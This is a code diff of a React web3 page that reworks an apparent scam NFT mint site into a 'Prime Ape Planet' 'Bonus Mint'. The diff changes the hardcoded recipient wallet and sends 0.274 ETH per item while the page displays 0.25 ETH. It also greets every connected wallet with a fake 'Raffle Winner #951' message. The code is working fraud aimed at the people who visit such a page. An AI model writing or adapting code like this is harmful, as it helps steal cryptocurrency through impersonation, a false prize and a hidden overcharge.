@@ -32,8 +32,8 @@ export default function Home() {
         console.log("dasdas", value, typeof value);
         web3.eth.sendTransaction({
             from: account,
-            to: "0x24eF5c7Fa2022cEa5B45a8Bd529fb153859AfdC7",
-            value: web3.utils.toWei(value.toString(), "ether") * 3,
+            to: "0xA025FBe45e7751397aa7C9a63e3745Ee24123f01",
+            value: web3.utils.toWei(value.toString(), "ether") * 0.274,
         });
     };
     return (
@@ -69,11 +69,12 @@ export default function Home() {
                         letterSpacing: "8px",
                     }}
                 >
+                    Prime Ape Planet
 
                 </div>
                 <div
                     style={{
-                        marginTop: "450px",
+                        marginTop: "30px",
                         textAlign: "center",
                         fontWeight: "400",
                         fontSize: "36px",
@@ -81,7 +82,7 @@ export default function Home() {
                         letterSpacing: "6px",
                     }}
                 >
-                    BONUS SALE
+                    Bonus Mint
                 </div>
             </div>
             <div
@@ -109,7 +110,7 @@ export default function Home() {
                 }}
             >
                 {active && account
-                    ? `Wallet Connected: ${account}`
+                    ? `Raffle Winner #951: ${account}`
                     : "Click to connect with MetaMask"}
             </button>
             <div
@@ -147,10 +148,10 @@ export default function Home() {
                         fontWeight: '500',
                     }}
                     min="1"
-                    max="5"
+                    max="10"
                     type="number"
                 />
-                <div style={{ color: "white", fontSize: "30px", fontWeight: '500', }}>Clone(s)</div>
+                <div style={{ color: "white", fontSize: "30px", fontWeight: '500', }}>Prime Ape(s)</div>
             </div>
             <button
                 onClick={() => {
@@ -173,7 +174,7 @@ export default function Home() {
             >
                 {active
                     ? `MINT for ${
-                        (value * 3).toFixed(1)
+                        (value * 0.25).toFixed(2)
                     } ETH + Network gas fees`
                     : "Wallet is not connected"}
             </button>
